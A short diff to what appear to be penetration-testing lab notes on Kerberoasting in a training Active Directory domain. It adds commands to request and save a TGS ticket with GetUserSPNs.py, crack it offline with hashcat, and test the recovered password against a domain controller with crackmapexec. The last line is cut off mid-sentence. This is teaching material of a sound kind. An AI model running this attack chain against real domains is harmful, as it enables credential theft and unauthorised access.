@@ -58,5 +58,19 @@ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 #### Saving the TGS Ticket to an Output File
 
 ```shell
-
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 ```
+
+#### Cracking the Ticket Offline with Hashcat
+
+```shell
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
+```
+
+#### Testing Authentication against a Domain Controller
+
+```shell
+sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+```
+
+found that sqldev in
